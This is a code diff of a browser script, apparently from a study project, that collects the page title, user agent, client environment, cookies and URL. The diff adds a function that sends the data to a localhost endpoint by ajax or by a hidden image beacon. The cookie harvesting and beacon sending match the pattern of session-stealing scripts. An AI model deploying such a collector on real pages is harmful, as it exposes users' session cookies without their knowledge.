@@ -1,7 +1,7 @@
 // v1.0  
 // 抓取标题
 // 抓取 userAgent
-// TODO 分析客户端环境(系统, 浏览器环境)
+// 分析客户端环境(系统, 浏览器环境)
 // 抓取cookie值
 // 抓取URL地址信息
 // 源生ajax请求
@@ -293,16 +293,43 @@ window.onload = function() {
         return jsonData;
     }
 
+    // 发送数据请求
+    // url: 接受数据接口地址
+    // sendData: 收集到的数据, json格式
+    // type: 2种请求, ajax, img
+    function sendRequest(url, sendData, type) {
+        if (type === 'ajax') {
+            // ajax请求
+            ajax('post', url, {"data": sendData},function(data){
+                    console.log(data);
+                }, function(error){
+                    console.log(error);
+            });
+            return;
+        }else if (type === 'img') {
+            // img请求
+            // 为了防止缓存，经常会用毫秒的时间作为随机数
+            var _make_rnd  = function(){
+                return (+new Date()) + '.r' + Math.floor(Math.random() * 1000);
+            };
+            var src = url + '?data=' + sendData;
+            var win = window;
+            var n = 'jsFeImage_' + _make_rnd();
+            img = win[n] = new Image();
+            img.onload = img.oneror = function() {
+                win[n] = null;
+            }
+            img.src = src;
+            return;
+        }
+    }
 
-    // 测试请求
+
+
+    var url = "http://localhost/kaen/studyLumen/public/add";
     var sendData = getCollectData();
-    ajax('post', 'http://localhost/kaen/studyLumen/public/add', 
-        {"data": sendData},
-        function(data){
-            console.log(data);
-        }, function(error){
-            console.log(error);
-    });
+    var type = 'img';
+    sendRequest(url, sendData, type);
 }
 
 
